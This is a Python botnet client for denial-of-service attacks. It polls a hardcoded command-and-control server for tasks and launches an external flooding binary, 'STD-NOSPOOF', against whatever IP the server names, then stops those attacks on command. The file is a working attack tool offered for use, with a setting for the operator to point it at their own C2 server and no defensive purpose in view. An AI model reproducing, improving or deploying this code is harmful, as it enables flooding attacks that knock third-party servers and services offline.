import requests
import subprocess
import os
import time
import sys
import uuid

# === BOT SETTINGS ===
API_URL = "http://85.137.165.57:5000" # CHANGE THIS TO YOUR API IP
POLL_INTERVAL = 1 
ID_FILE = "bot_id.txt"              
# =====================

active_processes = {}

def get_or_create_bot_id():
    if os.path.exists(ID_FILE):
        with open(ID_FILE, "r") as f:
            bot_id = f.read().strip()
            if bot_id:
                return bot_id
                
    bot_id = f"Bot-{uuid.uuid4().hex[:6]}"
    with open(ID_FILE, "w") as f:
        f.write(bot_id)
        
    return bot_id

def execute_start(ip):
    if not os.path.exists("./STD-NOSPOOF"):
        print(f"[!] ERROR: ./STD-NOSPOOF not found!")
        return False

    print(f"[+] Command START {ip}:80. Running tool...")
    try:
        proc = subprocess.Popen(
            ["./STD-NOSPOOF", ip, "53"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        active_processes[ip] = proc
        print(f"[OK] Attack on {ip} started (PID: {proc.pid})")
        return True
    except Exception as e:
        print(f"[-] Start error: {e}")
        return False

def execute_stop(ip=None):
    targets_to_stop = [ip] if ip else list(active_processes.keys())
    
    if not targets_to_stop:
        print("[i] Nothing to stop.")
        return

    for target in targets_to_stop:
        if target in active_processes:
            proc = active_processes[target]
            print(f"[*] Command STOP for {target}. Killing PID {proc.pid}...")
            try:
                proc.terminate()
                proc.wait(timeout=3)
                print(f"[OK] Attack on {target} stopped.")
            except:
                proc.kill()
                print(f"[OK] Attack on {target} force killed.")
            finally:
                del active_processes[target]

def check_for_commands(bot_id):
    try:
        response = requests.get(f"{API_URL}/get_task", params={"bot_id": bot_id}, timeout=3)
        data = response.json()

        if data.get("status") == "active":
            cmd = data.get("command")
            ip = data.get("ip")

            if cmd == "start":
                execute_start(ip)
            elif cmd == "stop":
                if ip:
                    execute_stop(ip)
                else:
                    execute_stop()

    except requests.exceptions.RequestException:
        pass 
    except Exception as e:
        print(f"[-] Poll error: {e}")

def cleanup_and_exit():
    print("\n[*] Exiting... Stopping local attacks...")
    for ip, proc in active_processes.items():
        proc.kill()
    print("[OK] Done.")
    sys.exit(0)

def main():
    BOT_ID = get_or_create_bot_id()
    
    print(f"=====================================")
    print(f"  Bot ID: {BOT_ID}")
    print(f"  Server: {API_URL}")
    print(f"  Tool:   ./STD-NOSPOOF")
    print(f"=====================================")
    print("Bot is running in background and listening to API.")
    print("Press Ctrl+C to exit and stop all attacks.")
    print("=====================================\n")

    try:
        while True:
            check_for_commands(BOT_ID)
            time.sleep(POLL_INTERVAL)
    except KeyboardInterrupt:
        cleanup_and_exit()

if __name__ == '__main__':
    main()
